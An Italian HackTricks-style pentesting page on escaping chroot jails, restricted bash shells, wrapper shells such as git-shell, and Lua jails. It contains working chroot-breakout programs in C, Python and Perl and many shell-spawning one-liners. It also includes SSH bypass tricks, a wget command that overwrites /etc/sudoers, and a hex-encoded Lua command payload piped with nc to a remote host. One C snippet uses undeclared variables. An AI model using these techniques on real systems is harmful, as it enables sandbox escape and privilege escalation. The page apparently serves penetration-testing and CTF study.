# Escape dalle Jail

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Cerca su** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se puoi eseguire qualsiasi binary con la proprietà "Shell"**

## Escape da Chroot

Da [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Il meccanismo chroot **non è destinato a difendere** da manomissioni intenzionali da parte di **utenti privilegiati** (**root**). Sulla maggior parte dei sistemi, i contesti chroot non si annidano correttamente e i programmi chrootati **con privilegi sufficienti possono eseguire un secondo chroot per evadere**.\
Di solito questo significa che per evadere devi essere root all'interno del chroot.

> [!TIP]
> Il **tool** [**chw00t**](https://github.com/earthquake/chw00t) è stato creato per abusare dei seguenti scenari ed evadere da `chroot`.<sup>[[1]](#references)</sup>

### Root + CWD

> [!WARNING]
> Se sei **root** all'interno di un chroot **puoi evadere** creando **un altro chroot**. Questo perché 2 chroot non possono coesistere (in Linux), quindi se crei una cartella e poi **crei un nuovo chroot** su quella nuova cartella mentre **ti trovi al di fuori di essa**, ora sarai **al di fuori del nuovo chroot** e quindi ti troverai nel FS.
>
> Questo accade perché di solito chroot NON sposta la tua working directory in quella indicata, quindi puoi creare un chroot ma trovarti al di fuori di esso.

Di solito non troverai il binary `chroot` all'interno di una chroot jail, ma **potresti compilare, caricare ed eseguire** un binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Questo è simile al caso precedente, ma in questo caso l'**attaccante salva un file descriptor della directory corrente** e poi **crea il chroot in una nuova cartella**. Infine, poiché ha **accesso** a quel **FD** **al di fuori** del chroot, vi accede e **fugge**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD può essere passato tramite Unix Domain Sockets, quindi:
>
> - Crea un processo figlio (fork)
> - Crea un UDS affinché il processo padre e quello figlio possano comunicare
> - Esegui chroot nel processo figlio in una cartella diversa
> - Nel processo padre, crea un FD di una cartella che si trova al di fuori del chroot del nuovo processo figlio
> - Passa al processo figlio quell'FD usando l'UDS
> - Il processo figlio esegue chdir verso quell'FD e, poiché si trova al di fuori del suo chroot, evaderà dalla jail

### Root + Mount

> [!WARNING]
>
> - Monta il dispositivo root (/) in una directory all'interno del chroot
> - Esegui chroot in quella directory
>
> Questo è possibile in Linux

### Root + /proc

> [!WARNING]
>
> - Monta procfs in una directory all'interno del chroot (se non è già presente)
> - Cerca un pid che abbia un valore root/cwd diverso, come: /proc/1/root
> - Esegui chroot verso quella entry

### Root(?) + Fork

> [!WARNING]
>
> - Crea un Fork (processo figlio), esegui chroot in una cartella diversa e più interna nel FS e fai CD in essa
> - Dal processo padre, sposta la cartella in cui si trova il processo figlio in una cartella precedente al chroot del processo figlio
> - Questo processo figlio si ritroverà al di fuori del chroot

### ptrace

> [!WARNING]
>
> - In passato gli utenti potevano eseguire il debug dei propri processi da un processo di loro proprietà... ma ora questo non è più possibile per impostazione predefinita
> - In ogni caso, se è possibile, potresti usare ptrace su un processo ed eseguire uno shellcode al suo interno ([see this example](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Ottieni informazioni sulla jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modifica PATH

Verifica se puoi modificare la variabile d'ambiente PATH<sup>[[2]](#references)</sup>.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Utilizzo di vim
```bash
:set shell=/bin/sh
:shell
```
### Pager e visualizzatori di help

Molti ambienti limitati lasciano comunque disponibili **pager** o **visualizzatori di help**. Di solito è più rapido sfruttarli che provare a ricostruire `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Se `git` è disponibile, ricorda che il suo output della guida passa solitamente attraverso un pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Common GTFOBins one-liners

Una volta individuati i binari raggiungibili, prova prima gli shell spawner più ovvi:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Se puoi solo **iniettare argomenti** in un comando consentito (invece di eseguirlo liberamente), controlla anche **GTFOArgs**.

### Crea script

Verifica se puoi creare un file eseguibile con _/bin/bash_ come contenuto
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Ottenere bash da SSH

Se accedi tramite ssh, spesso puoi chiedere al server di eseguire un **programma diverso** invece della restricted login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Se `ssh` è uno dei pochi binari consentiti localmente, ricorda che può anche essere abusato come **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Dichiarare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Puoi sovrascrivere, ad esempio, il file sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Wrapper di shell limitate (`git-shell`, `rssh`, `lshell`)

Alcuni ambienti non forniscono una semplice `rbash`, ma wrapper come `git-shell`, `rssh` o `lshell`:

- `git-shell` accetta solo comandi Git lato server e qualsiasi elemento presente all'interno di `~/git-shell-commands/`. Se quella directory esiste, esegui `help` per elencare le azioni personalizzate consentite. Se puoi **scriverci**, qualsiasi eseguibile inserito in quella directory diventa raggiungibile.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` consentono comunemente solo operazioni con `scp`, `sftp`, `rsync` o in stile Git. In questi casi concentrati prima sulle **primitive di scrittura dei file**: carica `authorized_keys`, un file di avvio della shell o uno script helper in una posizione scrivibile, quindi riconnettiti con `ssh -t ...`.
- Se il wrapper filtra solo la riga di comando, elenca i binary raggiungibili e poi fai pivot nuovamente verso **GTFOBins / GTFOArgs**.

### Altri trucchi

Controlla anche:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Potrebbe essere interessante anche la pagina:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Trucchi per evadere dalle python jails nella seguente pagina:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

In questa pagina puoi trovare le funzioni globali a cui hai accesso all'interno di lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval con esecuzione di comandi:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Alcuni trucchi per **chiamare le funzioni di una libreria senza usare i punti**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerare le funzioni di una libreria:
```bash
for k,v in pairs(string) do print(k,v) end
```
Nota che ogni volta che esegui il **one liner** precedente in un ambiente Lua diverso, l'ordine delle funzioni cambia. Pertanto, se devi eseguire una funzione specifica, puoi effettuare un attacco brute force caricando ambienti Lua diversi e chiamando la prima funzione della libreria:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Ottenere una shell lua interattiva**: Se ti trovi all'interno di una shell lua limitata, puoi ottenere una nuova shell lua (e, si spera, illimitata) chiamando:
```bash
debug.debug()
```
## Riferimenti

- [1] [Chw00t: Come evadere da varie soluzioni chroot (Bucsay Balazs, talk e slide di DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [Manuale di riferimento di GNU Bash – La shell limitata](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Documentazione di Git](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
